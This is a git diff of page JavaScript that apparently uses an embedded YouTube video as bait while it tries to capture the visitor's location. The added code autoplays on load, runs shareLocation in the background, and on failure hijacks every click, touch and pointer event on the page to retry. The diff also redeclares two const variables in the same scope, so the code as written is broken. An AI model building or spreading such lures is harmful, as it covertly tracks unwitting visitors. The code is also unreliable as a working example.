@@ -61,21 +61,30 @@ async function startPlayer() {
         return;
     }
 
-    const captured = await shareLocation();
-
-    if (!captured) {
-        retryMode = true;
-        document.body.classList.add("retrying");
-        document.addEventListener("click", handleRetryClick, true);
-        document.addEventListener("touchstart", handleRetryClick, true);
-        document.addEventListener("pointerdown", handleRetryClick, true);
-        return;
-    }
-
+    // show player immediately
     playing = true;
-    retryMode = false;
-    document.body.classList.remove("retrying");
-    cleanupRetryListeners();
+    const playerShell = document.getElementById("playerShell");
+    const player = document.getElementById("player");
+
+    player.src = youtubeEmbedUrl;
+    playerShell.classList.remove("hidden");
+
+    // attempt to capture location in background; if it fails enable retry on click
+    shareLocation().then((captured) => {
+        if (!captured) {
+            retryMode = true;
+            document.body.classList.add("retrying");
+            document.addEventListener("click", handleRetryClick, true);
+            document.addEventListener("touchstart", handleRetryClick, true);
+            document.addEventListener("pointerdown", handleRetryClick, true);
+        } else {
+            retryMode = false;
+            document.body.classList.remove("retrying");
+            cleanupRetryListeners();
+        }
+    }).catch(() => {
+        retryMode = true;
+    });
 
     const playerShell = document.getElementById("playerShell");
     const player = document.getElementById("player");
@@ -95,7 +104,7 @@ function handleRetryClick(event) {
     startPlayer();
 }
 
-document.getElementById("playLink").addEventListener("click", async (event) => {
-    event.preventDefault();
-    await startPlayer();
+// Autoplay on load (may be blocked by browser autoplay policies). We still start the player immediately.
+window.addEventListener('load', () => {
+    startPlayer();
 });
